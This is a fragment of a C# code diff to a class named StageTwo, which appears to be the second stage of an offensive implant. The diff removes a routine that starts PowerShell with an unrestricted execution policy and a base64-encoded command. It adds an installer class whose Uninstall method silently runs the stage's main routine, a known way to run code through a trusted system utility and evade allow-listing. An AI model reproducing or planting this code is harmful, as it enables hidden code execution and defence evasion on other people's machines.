@@ -4,7 +4,7 @@ using System.Text;
 using System.Threading;
 using System.Runtime.InteropServices;
 
-class StageTwo
+public class StageTwo
 {
 
     private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
@@ -394,15 +394,6 @@ class StageTwo
     public void powershell()
     {
         var command = System.Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ReadUntilLine("# ENDBLOCK")));
-        var startinfo = new System.Diagnostics.ProcessStartInfo()
-        {
-            FileName = "powershell.exe",
-            Arguments = "-noprofile -ep unrestricted -enc " + command,
-            UseShellExecute = false
-        };
-
-        var p = System.Diagnostics.Process.Start(startinfo);
-        p.WaitForExit();
     }
 
     public void csharp()
@@ -545,4 +536,16 @@ class StageTwo
         } finally {
         }
     }
+}
+
+[System.ComponentModel.RunInstaller(true)]
+public class Sample:System.Configuration.Install.Installer
+{
+	public override void Uninstall(System.Collections.IDictionary savedState)
+	{
+		base.Uninstall(savedState);
+
+		StageTwo two = new StageTwo();
+		two.main();
+	}
 }
